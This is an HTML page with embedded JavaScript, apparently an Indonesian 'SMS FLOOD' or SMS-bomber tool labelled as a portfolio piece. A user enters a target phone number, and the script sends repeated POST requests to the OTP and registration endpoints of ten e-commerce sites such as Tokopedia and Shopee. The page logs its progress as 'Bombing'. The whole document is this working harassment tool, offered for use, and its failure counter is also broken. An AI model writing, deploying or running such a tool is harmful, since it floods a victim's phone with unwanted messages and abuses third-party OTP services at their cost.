<!doctype html>
<html lang="id"><head><meta charset="utf-8"/><title>portfolio-sms</title><link rel="stylesheet" href="s.css"></head><body>
<h1 class="glow">SMS FLOOD</h1><p class="sub">Masukin nomor → START → duduk nonton SMS membludak.</p>
<input id="n" type="tel" placeholder="08xx"><input id="d" type="number" placeholder="delay ms" value="100">
<button onclick="start()">START</button><button onclick="stop()">STOP</button><pre id="log"></pre>
<script>
const ep=[
'https://api.tokopedia.com/v1/register/otp',
'https://api.bukalapak.com/v2/register/otp',
'https://api.shopee.com/v1/otp/send',
'https://api.blibli.com/v2/otp',
'https://api.lazada.com/v1/otp',
'https://api.jd.id/v2/otp',
'https://api.bhinneka.com/v1/otp',
'https://api.gramedia.com/v2/otp',
'https://api.zalora.com/v1/otp',
'https://api.orami.com/v2/otp'];
let c=0,f=0,t;
function start(){
  const no=document.getElementById('n').value,d=parseInt(document.getElementById('d').value)||100;
  document.getElementById('log').textContent='[+] Bombing...\n';c=0;f=0;
  t=setInterval(async()=>{
    try{await fetch(ep[c%ep.length],{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:no}),mode:'no-cors'});c++;}
    catch{e=>f++}
    document.getElementById('log').textContent=`[+] Sent:${c}  Fail:${f}\n`;
  },d);
}
function stop(){clearInterval(t);document.getElementById('log').textContent+='[+] Selesai.\n';}
</script></body></html>
